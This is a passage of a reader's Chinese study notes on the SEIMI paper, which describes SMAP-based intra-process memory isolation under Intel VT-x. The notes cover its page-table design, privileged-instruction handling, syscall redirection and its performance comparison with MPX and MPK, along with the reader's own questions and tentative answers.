具体地讲，设置了VMCS的guest-state字段和相关联的段描述符的信息。把描述符表清空掉之后，再切换段时需要通过段选择器访问段描述符表，进而抛出异常 当SEIMI捕获到抛出的异常时，SEIMI模块检测这些操作是不是合法的，如果合法，那么模块将会模拟这条指令，把被请求的段信息填充到VMCS中与之相关的段寄存器中，并且返回到VMX non-root模式。合法指的是程序在ring 3级别下访问 抛出#PF。SYSEXIT/SYSRET指令将切换段并且将固定的值填入到描述符缓存中，而不需要访问段描述符表。因此这两条指令将不会抛出#GP异常。但是因为这两条指令的执行将会把CPL设置为3，并因此而在ring 3级别下执行，这就因此保证了这些指令在ring 3下不会访问到任何S-page。所以在CPU执行到SYSEXIT/SYSRET的下一条指令时，将会抛出一个page fault异常。 为什么？只有ring 0 级别能够访问S-page？对的，只有ring 0级别可以访问S-page，由于指令应该是从S-page来读取的，并且在SYSEXIT/SYSRET执行后变成了ring 3级别，因此在取下一条指令时会抛出#PF异常。SYSEXIT/SYSRET指令有什么具体的功能？ 使执行无效：对于INV-Type类型的指令，直接使执行结果无效，从而不会允许这些指令修改任何内核状态或获取信息。 与CR*寄存器相关的指令。对于%CR0到%CR4的控制寄存器相关的load/store指令，Intel VT-x支持了VMCS配置来控制这些指令的操作，两个寄存器有一套guest/host的掩码和read shadows.guest/host mask的每个bit指明了寄存器的所有权，如果对应的bit是0，那么guest可以读和写，否则，host可以读和写。在后一种情况中，当guest读寄存器的值时，将会从read shadows中读取，而在写寄存器的值时，将不会真的写入对应的寄存器。 基于上面所说的特性，SEIMI将guest/host掩码的所有的bit设置为1（这样guest将无法修改CR0和CR4寄存器），将read shadows的所有的bit设置为0，也就是说guest读取的CR0和CR4寄存器的值为全0，写的话没有任何影响。 %CR2控制寄存器在出现page fault时用来保存错误的地址，因为guest的异常直接触发了VM exits，错误的地址将被保存在VMCS中而%CR2并没有记录任何错误的地址，所以攻击者将不会从这个寄存器中读取到任何有用的信息，因此读取这个寄存器是没有意义的。 SWAPGS, L[AR/SL]，VER[R/W]。SWAPGS指令被用来快速交换%GS和MSR中的地址，SEIMI将MSR寄存器与%GS段基地址设置为相同的值，所以SWAPGS这条指令没有任何意义。LAR和LSL指令被用来获取访问权限和从关联的寄存器获取限制信息，VERR和VERW用来验证一个段时可读的和可写的。 因为描述符表已经被清空了，所以执行这条指令将会触发一个描述符加载段冲突和RFLAG。ZF标识位将会被设置为0.SEIMI无法模拟这些指令的执行，所以这些执行将会被忽略。幸运的是，这四条指令在应用程序中很少会被用到。 所以不会有任何指令会使这两个寄存器的值不一样吗？ CLI/STI和POPF/POPFQ。CLI/STI指令可以修改系统标记IF，记录在RFLAGS，POPF/POPFQ指令可以修改IOPL和AC。IF标志位用来屏蔽硬件中断，IOPL用来控制I/O相关指令的条件执行。在SEIMI中，对于IF和IOPL修改将没有任何的作用。中断和I/O指令都会触发无条件的VM exits。 为什么修改不会产生任何作用？因为privileged hardware resources都被放到了VMX root模式，因此在中断或I/O时会触发VM exits陷入到VMX root 模式，由内核来处理 消除POPFQ对AC的影响。 POPFQ指令可以通过修改AC标志位启用或关闭SMAP。因此，需要确保用户代码无法使用POPFQ指令或修改AC标志位。但是由于POPFQ需要被执行，因此选择阻止其修改AC标志位。在每一条POPFQ指令前插入一条and指令，所以stack对象的AC标志位永远是0，也就是说永远无法通过POPFQ指令将AC标志位修改为1。因为在威胁模型中，攻击者无法劫持控制流，因此无法跳过and指令。 这是怎么做到的在POPFQ前插入一条指令？我也不知道 为什么这里要避免用户指令启用或关闭SMAP？应该由谁来启用SMAP？应该是内核/SEIMI来决定能不能进行读写的，否则使用SMAP毫无意义 C. Redirecting and Delivering Kernel HandlersSystem-call handling.SYSCALL指令无法将控制流从VMX non-root转换到VMX root模式。使用VMCALL来替换SYSCALL，VMCALL通过将代码页映射到目标内存空间，包括两条指令VMCALL和JMP *%RCX。之后设置guest的IA32_LSTAR MSR寄存器，这一寄存器用来指明系统调用的入口，将其值改为VMCALL的地址。 一旦进程执行了SYSCALL，控制流将会被转移到执行VMCALL来触发hypercall，并且\tSYSCALL的下一条指令的地址将会被存放到%RCX寄存器中，SEIMI模块向量通过内核系统调用表hypercall，并且调用关联的系统调用句柄。在其执行返回后，模块执行VMRESUME来返回到VMX non-root模式，并且执行JMP指令跳转到SYSCALL的下一条指令。Hardening system calls against confused deputy.攻击可以利用系统调用来间接的访问被隔离的内存区域，因为OS内核拥有特权访问整个用户空间，并且他们的代码没有被address-based和domain-based方法限制。SEIMI动态地检查指定的地址和count参数来确保指定的内存范围与隔离的内存区域没有重叠地区域，否则，SEIMI将会在系统调用中返回一个error.主要针对write/read这种通过内核来执行的I/O函数等。Interrupts and exceptions handling.在SEIMI中执行目标进程期间，所有的中断和异常都会触发VM exits，并且这些VM exits应该被SEIMI处理。SEIMI配置了VMCS，所以当中断或异常产生时，控制流将会转移到SEIMI模块，SEIMI通过中断描述符表处理中断或异常，执行权限检查，并且调用对应的处理函数。因为target process 在ring 0 级别运行，error_code的U/S bit为0，为了确保内核的异常处理函数可以正确处理异常，因此将U/Sbit设置为1。在处理函数返回之后，模块执行VMRESUME返回到VMX non-root模式， 隔离S-page区的缺页异常的故障地址要重定位到隔离的U-page区，因为host页表的隔离S-page区没有映射，内核不能处理该区域的异常。 我的理解：第254个页表项被配置为S-page，第255个页表项被配置为U-page，作为隔离存储区，其中两个页表都是映射到原来host页表的第255个页表项对应的内存区域，0~254个页表配置为S-page，其中第254个是只读的，第255个配置为U-page，其实只要把0~254个顶级页表目录项的U/Sbit置为0，就变成了S-page 直接设置U/Sbit不会出现问题？不会，S-page的只读由操作系统的R/W标志位确定，U-page的读写由SMAP机制来保证Linux signal handling：SEIMI在控制流从VMX root模式下转换到VMX non-root模式下时处理信号。模块在返回到VMX non-root模式之前，通过执行signal_pending()函数检查信号队列，队列中存在信号，那么模块调用do_signal()函数来保存中断上下文，并且切换到信号处理上下文，之后将新的上下文设置为VCPU，并且返回到VMX non-root模式来执行处理函数，当处理器返回时，通过sigreturn()陷入到SEIMI模块。模块将之前保存的上下文恢复到VCPU，然后返回到VMX non-root模式继续执行。V. ImplementationA. SEIMI APIs和用法如果参数need_ro是false，那么sa_alloc()将会只分配隔离的U-page，并且返回基地址。如果need_ro是true，那么会同时分配一个S-page，与U-page共享内存。S-page的偏移值将会通过参数offset返回，假设U-page的及地址是addr，那么S-page的基地址是addr+offset。因此即使SMAP启用之后，defense依然可以通过addr+offset访问S-page。为了在VMX non-root模式下运行目标应用，用户应该加载SEIMI的内核模块并且在运行前指定target application。当内核模块加载完成后，为所有的核心启用VT-x并且立即将当前的系统放在VMX root模式下。B. The Start and Exit of the Target ProcessSEIMI首先调用内核中的初始处理函数来初始化进程，然后为target process创建VCPU结构并且使用target process 的上下文初始化VCPU。在进程在VMX non-root模式下的ring0级别运行时，VCPU包括了初始的上下文，RIP寄存器保存了进程的入口，段选择器CS和SS的RPL字段被设置为0。之后SEIMI使用VMLAUNCH指令来将进程放到VMX non-root模式的ring 0权限下执行。因为%CS的RPL域是0，因此目标进程将进入ring 0级别执行。对于子线程或子进程，同样会为进程/线程创建一个VCPU并将其放入ring 0级别下运行。段选择器CS SS ES DS保存了段地址。SEIMI为每个子线程都创建了一个新的VCPU，并且线程通过设置RFLAGS中的AC标志位仅在当前线程内有效，而不会影响到其他线程，因此SEIMI是线程安全的。线程独立特性确保了即使在SMAP禁用的情况下发生VM exit事件，依然能够保证安全性。同时AC标志位默认置0，即SMAP默认是启用的。C. 实现安全的内存管理避免PML4’中的第254和第255号的重叠为了避免应用使用隔离的内存区域，SEIMI模块通过拦截内核中的load_elf_binary函数并修改这个进程的mmap_base来防止堆栈和ld.so被分配到这个区域。由于用户可能使用mmap()函数在固定的地址分配一块内存空间，因此SEIMI同样验证这个函数来避免在隔离的内存区域分配内存。处理VSYSCALL由于部分系统调用会被放在内存中的固定地址并且超出了用户空间的范围，因此需要PML4’的第511个页表项，所以需要设置PML4‘511个页表项所指的页目录项。这个页被设置为S-page.第511个页目录项不能被全部复制过来跟踪PML4页面的更新SEIMI将PML4页面设置为只读的，所有的写操作将会触发缺页中断，然后被SEIMI拦截，这可以通过配置中断描述符表 IDT 来实现。SEIMI模拟写指令的执行并且同步到了PML4’上。由于PML4是顶级页表很少被 修改，因此这只会有非常小的性能损耗。避免利用TLB访问内核使用Virtual Processor Identifier(VPID)来避免频繁进行TLB刷新带来的性能开销。通过为每个客户VM和host配置一个唯一的VPID，并且仅仅可以通过VPID分组来访问自己的TLB表项。为了让guest TLB与页表同步，SEIMI同样通过使用mmu_notifier机制拦截了页表更新操作，并且使target process相关联的TLB表象的映射无效。VPID是Intel 提供的机制这是怎么添加的VPID，并且怎么实现的分组，TLB应该是硬件实现的VPID是在硬件上对TLB资源管理的而优化，通过在硬件上为每个TLB项增加一个标识，用于不同的虚拟处理器的地址空间，从而区分Hypervisor和不同处理器的TLB。硬件区分不同的TLB项分别属于不同的虚拟处理器，因此可以避免每次进行VM-Entry和VM-Exit时都让TLB全部失效，可以提高VM切换的效率。所以说，TLB在VM状态切换后，不会全部切换？因此可以减少一些不必要的页表访问，减少了内存的访问次数，提高Hypervisor和客户机的运行速度。处理API请求在sa_alloc()，SEIMI将会调用do_mmap()，没太看懂VI. Evaluation使用了四个防御机制：OCFI SS CPI AG(都是IH-based defense)在四种情况下执行实验：1， 仅被IH-based保护 2， 被MPX-based保护\t3. 被MPK-based保护 \t4.被SEIMI-based保护前面不是说只使用IH-based defenses吗，回过头来仔细看看VM exits的开销更高。测试了四个基于IH的防御机制，使用SEIMI来保存秘密数据。Microbenchmarks：使用lmbench来测试负载。为了避免与domai-switching 的负载混淆，直接在SEIMI上面运行lmbench来检测内核指令的负载。Macrobenchmarks：使用上面的四个IH防御机制来保护每个benchmark。测试了四种情况：分别被IH、MPX、MPK、SEIMI保护。 baseline是无任何保护措施。采用IH、MPX、MPK、SEIMI分别保护基准程序，比较其性能Real-world applications：选择了12个常用的服务器或桌面程序。Microbenchmarks EvaluationSEIMI在处理轻量级的系统调用和信号时，引起的开销更加严重。轻量级的系统调用测试主要用来测试从用户空间陷入到内核态的开销。相比之下，hypercall的开销比system call更高。结果就是，内核操作非常简单的系统调用在启用SEIMI后有更重的开销负载。对于信号处理，SEIMI在保存和恢复中断上下文上需要执行额外的指令操作。上下文切换时间定义为保存一个进程状态到恢复另一个进程状态的时间。进程数相同时，工作集更大时SEIMI的负载更小。为什么？ 工作集更大，不会频繁换页引起从VMX non-root模式陷入到VMX root模式，因而开销更小性能分析：SEIMI的性能负载比MPX-based和MPK-based两种模式更小。但是在某些情况下，MPX-based比SEIMI更优。原因解释：address-based模式的负载主要来自于边界检查，而domain-based的负载主要来自于开启和取消权限。因此，哪种方式更好取决于保护的负载。定义CFreq为每毫秒边界检查的次数，而SFreq为每毫秒权限切换的次数。实验结果表明，在边界检查的频率是进程切换频率的52倍时，SEIMI优于MPX。随着权限切换频率的增长，SEIMI相对于MPK的性能优势更加明显，SEIMI的优势主要是由使用STAC/CLAC的SMAP切换比使用WRPKRU的MPK更加迅速。因此对于MPX来说，SEIMI比MPK拥有更大的性能优势。DiscussionOverloading the AC flagRFLAGS寄存器中的AC标志位在U-mode下被使用时是用来进行内存对齐检查的，在S-mode下被使用时被复用为控制SMAP。因此SEIMI无法依靠AC标志位实现对齐检查。事实上，SEIMI应该就是在S-mode下使用的AC标志位，并使用其控制SMAP。SEIMI使用STAC/CLAC来启用和关闭SMAP。Nested virtualizationSEIMI使用VT-x技术，所以除非目标hypervisor支持嵌套虚拟化，否则不允许SEIMI在虚拟机中使用。进行了两个测试：（1）在SEIMI上运行SPEC，在KVM上运行SEIMI（2）在SEIMI+KVM上运行lmbenchPossible incompatibility with future instructions.如果处理器支持了新的指令，依然可以通过相似的方法拦截部分指令的执行。Transient execution attacksaddress-based和domain-based防御机制都容易遭受Meltdown-type攻击。Related WorkLeveraging privileged hardware for user code.Dune在VMX non-root模式的ring 0级别运行用户进程，允许进程管理异常、页表和描述符表等。因此需要进程本身是安全地和可信的。对于不受信任的代码，Dune在ring 0级别运行一个沙盒，并在沙盒中以ring 3级别运行进程。SEIMI相对于Dune的本质不同在于，SEIMI允许不受信任的代码在ring 0级别运行，以牺牲安全性的代价换取了技能的提升。同时采取了其他方式来保证安全性。因为在ring 3级别运行代码会产生频繁的上下文切换，从而带来巨大的开销SEIMI的一些原创设计：使用SMAP实现进程内高效的内存隔离，设计了新的内存虚拟化方式将guest的虚拟地址直接转换为host的物理地址，因此避免由TLB不命中带来的内存虚拟化开销。传统的地址转换方式：guest的虚拟地址通过guest的页表转换为guest的物理地址，然后guest的物理地址通过EPT（扩展页表）转换为host的物理地址【57】证明SMAP可以被绕过几个问题 SEIMI解决的问题是什么 现有的防御memory-corruption攻击的技术都需要进程内的敏感数据的机密性和完整性保护 现有的能够保护进程内敏感数据的技术：information hiding，address-based isolation（代表是Intel的MPX），domain-based isolation（代表是Intel的MPK），information hiding的安全性不足，MPK和MPX的效率较低 SEIMI基于SMAP，实现了相对于现有的intra-process隔离技术更加高效的进程内的内存隔离技术， SEIMI是怎么解决这个问题的 借助于Intel VT-x技术，将target process放在VMX non-root的ring 0级别运行，将内核和SEIMI放在VMX root模式的ring0级别运行，其他的进程都放在VMX root模式的ring 3级别来运行。 利用SMAP实现部分内存的隔离，即ring 0级别的进程无法随意读取U-page，将target process的页表分成两种，其中0~253页表设置为S-page，正常使用，第254个目录项设置为只读的S-page，第255个目录项设置为U-page，可读可写，由于SMAP的限制，ring 0级别下运行的target process无法直接写U-page，需要通过STAC/CLAC来开启读的权限。同时第255个目录项和第254个目录项两个不同的虚拟页目录项映射到一个共同的地址空间，区别只在于R/Wbit不同和U/Sbit不同。同时，第0~255个页表项由kernel的顶级页表复制而来，并且SEIMI将内核的所有U-page设置为只读的，因此在内核希望修改PML4的页目录项时会触发缺页中断，SEIMI处理这个中断，模拟该指令的执行，同步修改host页表和guest页表。而guest无法修改自己的页表，页表属于privileged data structures，由SEIMI负责管理，在guest希望修改页表时应该抛出异常然后由SEIMI交给kernel来处理，所以guest在希望修改自己的页表时会触发VM exits，由在VMX root模式下运行的kernel来完成。实际上应该是trusted code完成对于SMAP的关闭和重新开启，而untrusted code应当只允许读而不允许写隔离区域。 同时SEIMI会根据指令执行的条件和结果，阻止特权指令的执行或使指令的执行无效化。 问题来了，U-page是可以被trusted code访问而不能被untrusted code访问还是均不能被访问（即在访问之前需要经过SEIMI鉴权）？应该是只有trusted code可以使用STAC/CLAC来启用和关闭SMAP，因此只有trusted code可以写U-page，而untrusted-code只能读隔离区 那么SEIMI做了什么呢?SEIMI的工作主要分成三个部分： 内存管理 拦截特权指令： SEIMI拦截ring 0级别的所有的特权指令并且阻止其访问privileged hardware features。 大部分特权指令可以通过Intel VT-x技术监视其执行，SEIMI可以利用这个来拦截，其他的指令SEIMI通过使其执行条件无效化来实现。 当EXIT-Type类型的指令在VMX non-root模式下执行时，可以触发VM exit。 抛出异常。对于EXP-Type类型的指令，SEIMI在执行时抛出异常。 取消VMCS的支持 涉及到切换段的指令，将段的信息保存在VMCS的guest-state字段中，清空段描述符表，在段描述符cache中保存正确的信息，这样可以保证不切换段的指令正常执行，切换段的指令抛出异常。 使指令的执行结果无效化。对于SWAP，使两个寄存器的值始终保持一直。对于POFPQ，在前面加一条and，使其无法通过POPFQ指令修改AC寄存器。对于CR*寄存器相关，将guest/host mask全置1，将read shadow置0. 重定向和交付给内核处理函数： 对于系统调用的处理，SEIMI将代码页映射到syscall的目的地址，相当于执行VMCALL和JMP %RCX指令，将SYSCALL的下一条指令的地址存在RCX寄存器中。SEIMI通过内核的系统调用表来调用相关的系统调用函数，并在处理函数返回后调用VMRESUME指令来返回到VMX non-root模式并执行JMP指令来返回到控制流中。 增强系统调用的抗代理人攻击的特性。因为内核可以访问整个用户空间，并且不会被地址检查和域检查限制，因此可以通过 read/write等系统调用来读取到不应该被访问的系统调用。SEIMI动态的检查这些系统调用访问的地址范围与隔离的内存区域是否有重叠。如果出现重叠，SEIMI返回错误，否则正常执行系统调用。 中断和异常处理。target process的中断和异常应该被SEIMI处理，所以SEIMI通过配置VMCS，使得在中断或异常触发时，控制流将会转移到SEIMI模块中。之后通过中断描述符表执行权限检查，并调用对应的处理函数。同时对于只读的S-page的访问将会被重定位到U-page中。在处理返回后，调用VMRESUME返回到non-root模式。 Linux信号处理。在从VMX root模式返回到non-root模式时，模块检查信号队列中是否有未处理的信号。如果有未处理的信号，那么保存中断上下文，创建一个VCPU结构，并使用信号处理函数的上下文初始化VCPU，切换到VCPU，返回到non-root模式下执行完信号处理函数。处理完之后陷入到SEIMI模块中并恢复之前保存的上下文到VCPU，并返回VMX non-root模式下继续运行。 还有什么问题等待被解决 SIMP可以被绕过，这是否说明SEIMI其实还是有潜在的安全风险 U-page和S-page的具体区别，能不能讲清楚 在表示上，应该是U-page的四级页表项的U/Sbit均为1，那么为U-page，否则如果其中任意一个页表项的S-page的U/Sbit为0，那么为S-page. 具体到功能上，S-page是在supervisor模式下的页面，而U-page是在user模式下的页面，由于SMAP机制的保护，ring 0级别下的code无法直接访问U-page，因此可以利用这个feature来实现页面的隔离。 在什么情况下应该使用哪种page 对于VMX root模式下运行的kernel和进程，其page保持正常 对于VMX non-root模式下运行的target process，其0~253 为S-page，与kernel的0~253个U-page相对应，因为ring 0级别，所以将其转换为S-page。 第254个entry和第255个entry用于实现读写分离，第254个page是只读S-page，第255个page是U-page，用于实现对于untrusted code的内存隔离 SEIMI的执行流程 SEIMI首先调用内核中的初始处理函数来初始化进程，然后为target process创建VCPU结构并且使用target process 的上下文初始化VCPU。在进程在VMX non-root模式下的ring0级别运行时，VCPU包括了初始的上下文，RIP寄存器保存了进程的入口，段选择器CS和SS的RPL字段被设置为0。之后SEIMI使用VMLAUNCH指令来将进程放到VMX non-root模式的ring 0权限下执行。因为%CS的RPL域是0，因此目标进程将进入ring 0级别执行。 对于子线程或子进程，同样会为进程/线程创建一个VCPU并将其放入ring 0级别下运行。 段选择器CS SS ES DS保存了段地址。 SEIMI为每个子线程都创建了一个新的VCPU，并且线程通过设置RFLAGS中的AC标志位仅在当前线程内有效，而不会影响到其他线程，因此SEIMI是线程安全的。 线程独立特性确保了即使在SMAP禁用的情况下发生VM exit事件，依然能够保证安全性。 一共四级页表，把用户空间的顶级页表拷贝过来之后，那么对应的其余三级页表怎么办？可以直接使用吗 SEIMI是复用了其余的三级页表，只对顶级页表的0~255个页表项的U/S bit和R/W bit进行了修改，实际上映射guest还是与kernel映射到相同的物理内存上。 target process和application process之间的区别？内核是怎么区分这两类进程的？ target process运行在VMX non-root mode的ring 0级别，application process运行在VMX root mode的ring 3级别。 等下看看evaluation部分，target process到底包含哪些部分？ 按我的理解，target process中可以有trusted process和untrusted process，其中隔离区域可以用来保存defense mechanism的敏感数据，然后使用defense mechanism来保护其他进程。 target programs可以是服务器程序或本地程序，要求tartget programs可以有memory-corruption 漏洞，攻击者可以利用此漏洞拥有随机的读和写的能力。 内核怎么启动的，SEIMI是怎么加载的 SEIMI编译target code，并且将其连接到SEIMI库的可执行文件，然后用户加载SEIMI的内核模块，并在运行SEIMI前选择target application。 在内核模块加载完毕后，为所有的核心启动VT-x，并且把现在的系统立即放在VMX root模式下运行。 用户应用通过execve()启动应用，对于other processes，在VMX root的ring 3模式下运行 对于target process的启动，调用初始的系统调用来创建进程，然后创建一个VCPU结构，使用target process的上下文来初始化这个VCPU。之后执行VMLAUNCH指令来将target process放入到VMX non-root模式下执行，由于%CS寄存器的RPL字段是0，所以会在ring 0级别下运行。 有哪些challenge，这些challenge是如何解决的 读写分离：U-page和S-page 阻止privileged data structures的泄露或修改：放在VMX root模式下 阻止privileged hardware features的滥用：收集所有的指令使其失效 如何进行内存管理的 因为host的kernel需要处理来自于guest的系统调用，因此host的页表和guest的页表应该保持一致 guest的物理内存应该被host的kernel直接管理。（与传统的虚拟机相比，传统的虚拟机中，guest应该通过guest 的页表将虚拟地址映射为guest的物理地址，然后经过EPT扩展页表将guest的物理地址映射为host的物理地址。）而在SEIMI中guest和host共享页表，因此可以直接经过页表映射为Host的物理地址。 SEIMI是复用了其余的三级页表，只对顶级页表的0~255个页表项的U/S bit和R/W bit进行了修改，实际上映射guest还是与kernel映射到相同的物理内存上。 SEIMI可以用来保护什么 用来保护defense mechanism的敏感数据 其中包括critical data structures that are frequently checked against or used for protection 比如O-CFI的BLT，CCFIR的safe SpringBoard，Shuffler的code-pointer table等 SEIMI在信号处理时会发生什么 再从VMX root模式返回到VMX non-root模式之前，SEIMI模块调用signal_pending()函数来判断队列中是否有信号 如果有信号存在，模块调用do_signal()保存中断上下文并且切换到信号处理上下文 将新的上下文加载到VCPU，返回到VMX non-root模块完成处理函数的执行。 在处理函数执行完后，陷入SEIMI模块，恢复之前保存的上下文到VCPU，之后返回到VMX non-root模块并继续。 MPX MPK和SEIMI的区别是什么 MPX是address-based MPK是domain-based SEIMI是基于SMAP，MPK和MPX都是利用的user space 的 硬件特性，而SEIMI是第一个基于ring 0级别的硬件特性的内存隔离机制。 SMAP是Intel/AMD处理器支持的一种硬件特性。 SEIMI如何切换不同的状态，切换时要做什么，开销有多大，需要考虑什么 在ring 0级别的进程触发VM exits时，切换不同状态： 访问特权数据结构：如页表等时触发VM exits陷入到VMX root模式，由SEIMI管理 执行特权指令： 部分特权指令触发VM exits并停止指令的执行，因此会切换状态。 trusted code使用STAC/CLAC启用或关闭SMAP，以写隔离区的内存 使用SEIMI的进程在VMX non-root模式的ring 0级别运行 只有在SMAP关闭后S-mode的进程才能够访问U-page。 处理器提供了两种仅在ring 0级别下执行的特权指令STAC和CLAC来启用/关闭SMAP。 U-mode和S-mode两个模式的区别，什么情况下应该使用哪种模式 U-mode是用户模式，S-mode是supervisor模式 ring 0时使用的是U-mode， RFLAGS中的AC标志位的作用 AC标识位的作用是标识是否开启SMAP Dune允许用户级别的线程在VMX non-root模式ring 0级别运行，同时允许进程管理异常、描述符表和页表。那么SEIMI在non-root模式下运行有什么特点？ SEIMI不允许进程管理异常、描述符表和页表，而是在VMX root模式下进行管理，不将这些特权数据结构暴露给进程 SEIMI的创新点？具体讲讲？ SEIMI第一次使用处理器支持的硬件特性，即SMAP实现内存区域的隔离 SEIMI使用了VT-x技术，将target process运行在VMX non-root模式的ring 0级别，并且将特权级别的数据结构保存在VMX root模式下，使用SEIMI拦截特权指令，实现了进程在ring 0级别的安全运行。这样避免了Dune中需要进程安全可信才能运行在ring 0级别的缺陷。 SEIMI使VMX root和non-root模式复用三级页表，可以通过页表直接将guest的虚拟地址映射到host的物理地址中，而不需要通过guest的虚拟页表映射到物理地址，再通过EPT映射到host 的物理地址，减少了内存访问的开销。 MPK/MPX可以执行代理人攻击，因为OS内核可以访问全部的用户空间，并且内核不会被address-bsed和domain-based限制，因此攻击者可以通过系统调用（read、write）来访问隔离的内存。为了解决代理人攻击，SEIMI动态检查指定的地址和count，以确保特定的地址范围与隔离的区域没有重合。否则，SEIMI返回error。 SEIMI，防御机制、通常的应用程序三者之间的关系？ target process运行在VMX non-root模式下的ring 0级别，由SEIMI保护，防御机制应该是target process的一种，使用防御机制保护一些需要安全性的进程 内核运行在VMX root模式下的ring 0级别，其他的进程，即other process运行在VMX root模式的ring 3 级别 untrusted code和trusted code访问U-page的不同操作？ untrusted code 会抛出处理器异常，trustedcode可以通过执行STAC/CLAC指令来访问U-page SEIMI的各项工作？ 包括三个核心组件：内存管理，特权指令拦截和事件重定向 内存管理用来配置常规/隔离的内存区域，实现基于SMAP的隔离，相当于实现了传统OS的内存管理功能 特权指令拦截组件用来防止被攻击者滥用特权指令 事件重定向组件用于在进程通过system call/interrupts/exceptions访问内核时配置和拦截VM exits。在拦截到exits后将其交付给kernel进行处理。 ​Note SEIMI要解决的问题： 现有的防御memory-corruption攻击的技术需要一个安全前提：高效的进程内的内存敏感数据的完整性和机密性保护。 现有的能够提供保存进程内内存敏感数据的技术： information hiding：分配一块随机地址，缺点是安全性不足 address-based isolation：不受信任的代码发起的每一个内存访问都需要检查敏感数据是否在内存范围内。性能开销主要来源于边界检查，MPX domain-based isolation：主要依靠权限管理，trusted code发起访问时将被授予访问权限，并在访问之后撤销权限。主要的开销来源于授予和撤销内存访问的权限。MPK SEIMI基于SMAP SEIMI是如何工作的？ SEIMI使用SMAP来阻止来自privileged untrusted user code到user mode中的敏感数据的访问。 在privileged trusted code访问敏感数据时，SMAP被暂时关闭，并且在结束访问时重新启用SMAP。 SMAP启动时，所有的向用户空间的内存访问都会抛出一个处理器异常。（SEIMI中的untrusted和trusted都是运行在ring 0级别，因此可以将敏感数据保存在用户空间来阻止访问） SMAP是线程私有的，因此在一个线程内暂时关闭SMAP不会影响到别的SMAP。 整个内存区域被分成两部分，一部分是U-page，另一部分是S-page，其中U-page是隔离区。trusted code通过STAC指令来关闭SMAP以访问U-page，访问后通过CLAC重新开启SMAP。 为了避免untrusted code在ring 0级别下运行污染内核，SEIMI在VMX root模式运行操作系统内核。target process在VMX non-root模式下运行。 SEIMI对于SMAP的使用带来了哪些问题？如何解决这些问题？ 如何防止ring 0级别的用户代码污染内核？ 使用硬件支持的虚拟化技术，将kernel运行在VT-x root模式。 用户代码运行在VT-x 非root模式，这样用户代码通过虚拟化技术实现了用户代码与kernel的隔离。 相关工作：Dune使用Intel VT-x使用户代码运行在特权级别，但是需要代码是trusted和安全地。 如何让untrusted code安全地运行在内核？ 防止代码访问两种硬件资源： privileged data resources(page tables， etc) privileged instructions 将privileged data resources保存在VMX root模式，使用Intel VT-x来强制特权指令触发VM exits以陷入到VMX root模式，并在root模式下完成指令的执行，这样不会将特权硬件资源暴露给用户代码 对于特权指令，根据不同的分类使其执行无效化或禁止执行。 SMAP的作用？在SEIMI中是怎么用的？ SMAP最初是用来防止内核在用户空间执行恶意代码，也就是说，不允许ring 0级别的代码触及到ring 3级别的数据？ x86中，运行状态分成了两个模式：U-mode和S-mode，其中： S-mode是ring 0，U-mode是ring 3 根据页表项，内存页被分成了S-page和U-page. 在SMAP关闭之后，S-mode的代码才能够访问U-page S-mode的代码可以通过设置RFLAGS的AC标志位来开启或关闭对于U-page的访问权限。 使用STAC/CLAC特权指令切换SMAP比切换MPK更快 威胁模型： SEIMI的目标是为防御机制提供进程内的隔离区域。 目标程序拥有可以被攻击者利用而获得随机读写的能力的安全漏洞 程序本身不是恶意软件 defense mechanism本身是安全的，因此破坏SEIMI的隔离性的前提是破坏defense mechanism defense mechanism在安全时可以保证SEIMI免受内存破坏攻击 defense的安全性依赖于SEIMI的隔离性 什么是目标程序？是defense mechanism还是通常的应用程序？应该是通常的应用程序 我认为目标程序可以是untrusted code也可以是trusted code，其中isolated memory是为defense mechanism准备的，可以是用defense mechanism保护进程运行在VMX non root模式的ring 0级别下。 难点： 区分SMAP读和写: 基于共享内存的读写分离方式： 为同一块物理内存分配了两块虚拟内存，其中一块被配置为U-page，可以被读/写，另一块被配置为S-page，只能被读 按照前文的说法，U-page是user mode的页面，而S-page是supervisor mode的页面 如果trusted code需要修改敏感数据，那么在关闭SMAP后，才可以对U-page进行修改 如果trusted code只需要读，那么直接读对应的S-page即可 前面所说的通过关闭SMAP访问U-page实际上应该是写U-page，读敏感数据似乎并不需要通过SMAP，而只需要读S-page即可 阻止修改或泄露privileged data structures 借助于Intel 的VT-x技术 将privileged data structures和operations放到VMX root模式 使所有的事件（sys call、exceptions、interrupts)都触发VM exits以陷入到VMX root模式，即陷入内核，然后在root模式中执行这些指令 阻止滥用privileged hardware features 修改指令使其触发VM exits并停止执行 使指令的执行结果无效 抛出处理器异常，或使执行无效 系统结构 使用SEIMI的进程在VMX non-root ring 0级别运行，可以直接访问SMAP。其他的进程在VMX root ring 3级别运行 SEIMI的进程安排对内核透明，在执行从内核返回到target process时，SEIMI自动切换VMX模式 SEIMI模块包括三个主要模块：内存管理，privileged-instruction prevention，event redirection 内存管理：用来为target process配置常规的和隔离的内存，用于实现基于SMAP的隔离 SEIMI没有在VMX non-root状态下运行的OS来管理内存，因此需要SEIMI来帮助guest管理页表 what is guest？ 我认为guest应该是在non-root下运行的targete process，host应该是在VMX 中运行的kernel和其他的用户进程 guest和host是虚拟化中的概念，其中guest相当于客户机，host是宿主机，在SEIMI中，具体应该为guest是target process，运行在VMX non-root模式下，host运行在VMX root模式下。 用户空间的内存布局应该在guest和host的页表中是一样的 guest的物理内存应该被host kernel直接管理 SEIMI能够灵活配置guest虚拟内存空间中的U-page和S-page guest不能访问host的内存 SEIMI只复制顶级页表的前256个页表项，将剩余的页表项清空，作为guest的PML4’页，下面三级页表guest与host共享 配置U-page和S-page.每个页表项都有一个U/S bit，用于判断页表项对应的是U-mode还是S-mode.如果所有的U/S bit都是1，那么对应的页是U-page，否则是S-page. 在host的页表中，所有的用户空间的内存页都是U-page.也就是说host不可直接写用户页。 SEIMI直接拷贝了host的顶级页表，因此拷贝过来的page还是U-page.但是实际上guest应该能够直接访问大部分页表，只有隔离的区域才应该被配置为U-page.所以将0~254个页表项的U/Sbit均置0，这样前255个页表项都变成了S-page。第255个表项仍然保留为U-page，其指向的内存区域作为隔离区域。 也就是说，SEIMI将guest中的非隔离内存区域变为了S-page，而在host的页表中，依然是U-page 因为需要区分读和写，因此需要将同一块隔离区域分别映射为S-page和U-page，SEIMI将第254个页表项作为只读的S-page，映射到第255个表项所指的内存区域，这样就实现了隔离的U-page和S-page共享同一块内存。SEIMI再修改R/W位来实现S-page的只读。 所有的S-page都是只读的吗？ 显然不是，应该只能被内核读写，而不能被user space 访问，在这篇论文中，应该指的是可以被VMX non root 模式下ring 0级别的代码访问，可以被VMX root模式下ring 0 级别的系统内核访问，而不能被VMX non-root模式下ring3 级别下的用户进程来访问。 